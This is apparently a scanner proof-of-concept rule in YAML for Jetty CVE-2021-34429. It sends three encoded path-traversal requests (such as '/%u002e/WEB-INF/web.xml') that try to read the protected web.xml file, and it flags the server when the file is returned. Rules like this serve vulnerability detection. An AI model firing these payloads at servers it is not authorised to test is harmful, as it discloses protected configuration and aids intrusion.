name: poc-yaml-jetty-cve-2021-34429
manual: true
transport: http
rules:
  r0:
    request:
      cache: FALSE
      method: GET
      path: /%u002e/WEB-INF/web.xml
    expression:
      response.status == 200 && response.body.bcontains(b"<web-app version=")
  r1:
    request:
      cache: FALSE
      method: GET
      path: /.%00/WEB-INF/web.xml
    expression:
      response.status == 200 && response.body.bcontains(b"<web-app version=")
  r2:
    request:
      cache: FALSE
      method: GET
      path: /a/b/..%00/WEB-INF/web.xml
    expression:
      response.status == 200 && response.body.bcontains(b"<web-app version=")
expression:
  r0() || r1() || r2()
detail:
  author: 落花
  links:
    - https://xz.aliyun.com/t/10039
  fingerprint:
    info:
      name: "Jetty"
      version: 9.4.37 ≤ Jetty ≤ 9.4.42, 10.0.1 ≤ Jetty ≤ 10.0.5, 11.0.1 ≤ Jetty ≤ 11.0.5
      type: "web_application"
